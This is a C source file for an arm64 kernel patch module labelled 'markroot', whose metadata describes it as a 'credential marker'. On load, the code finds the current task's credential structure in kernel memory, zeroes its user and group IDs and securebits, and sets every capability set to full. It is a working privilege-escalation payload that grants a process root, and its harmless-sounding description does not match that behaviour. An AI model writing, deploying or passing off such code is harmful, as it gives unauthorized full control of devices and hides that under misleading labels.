typedef unsigned long u64;
typedef unsigned int u32;

extern u64 cred_offset;

__attribute__((section(".kpm.info"), used))
static const char kpm_info[] =
    "name=markroot\n"
    "version=1\n"
    "license=GPL\n"
    "author=diag\n"
    "description=credential marker\n";

static inline u64 get_current_task(void) {
    u64 task;
    __asm__ __volatile__("mrs %0, sp_el0" : "=r"(task));
    return task;
}

__attribute__((section(".kpm.init"), used))
void kpm_init(void) {
    volatile u64 task = get_current_task();
    if (!task || !cred_offset) return;

    volatile u64 cred = *(volatile u64*)(task + cred_offset);
    if (!cred) return;

    volatile u64* q = (volatile u64*)(cred + 8);
    q[0] = 0;
    q[1] = 0;
    q[2] = 0;
    q[3] = 0;

    *(volatile u32*)((u64)&q[4]) = 0;

    volatile u64* caps = (volatile u64*)((u64)&q[4] + 8);
    caps[0] = 0x1ffffffffffUL;
    caps[1] = 0x1ffffffffffUL;
    caps[2] = 0x1ffffffffffUL;
    caps[3] = 0x1ffffffffffUL;
    caps[4] = 0x1ffffffffffUL;
}
